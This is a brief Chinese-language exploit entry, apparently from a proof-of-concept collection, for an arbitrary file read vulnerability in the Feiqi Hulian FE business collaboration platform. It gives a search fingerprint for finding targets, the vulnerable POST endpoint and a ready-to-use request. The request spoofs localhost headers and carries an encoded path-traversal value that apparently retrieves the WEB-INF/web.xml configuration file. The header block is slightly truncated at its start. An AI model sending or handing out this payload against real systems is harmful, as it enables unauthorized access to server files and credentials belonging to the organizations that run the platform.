# 飞企互联FE业务协作平台attachment存在任意文件读取漏洞

飞企互联FE业务协作平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="FE-协作平台"`
- **请求**：`POST /servlet/webchat/attachment/1 HTTP/1.1`

**Payload**
```
Gecko/20100101 Firefox/109.0
Content-Length: 164
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
mailAttachment=1&attachPK=%2Fv8AMQAJAC8ACQAvAAkALwAJAC8ALg
AuAC8ALgAuAC8ALgAuAC8AagBiAG8AcwBzAC8AdwBlAGIALwBmAGUAL
gB3AGEAcgAvAFcARQBCAC0ASQBOAEYALwB3AGUAYgAuAHgAbQBs
```
- **响应特征**：200